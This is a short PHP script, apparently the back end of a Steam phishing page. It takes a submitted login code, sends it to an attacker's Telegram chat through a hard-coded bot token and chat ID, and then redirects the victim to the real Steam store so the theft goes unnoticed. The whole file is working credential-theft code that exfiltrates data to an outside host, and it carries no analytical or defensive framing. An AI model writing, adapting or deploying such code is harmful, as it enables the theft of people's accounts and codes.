<?
$code = trim($_POST['login']);


$token = "1694421359:AAHZSsFiXfQzYoRVuywTpQQvmWgpQ_jZz7g"; // токен бота
$chatid = '1038162734'; // id чата 1


// отправка сообщения
$tbot = file_get_contents("https://api.telegram.org/bot".$token."/sendMessage?chat_id=".$chatid."&text=".urlencode("___Код___\n$code"));
header("Location: https://store.steampowered.com");
?>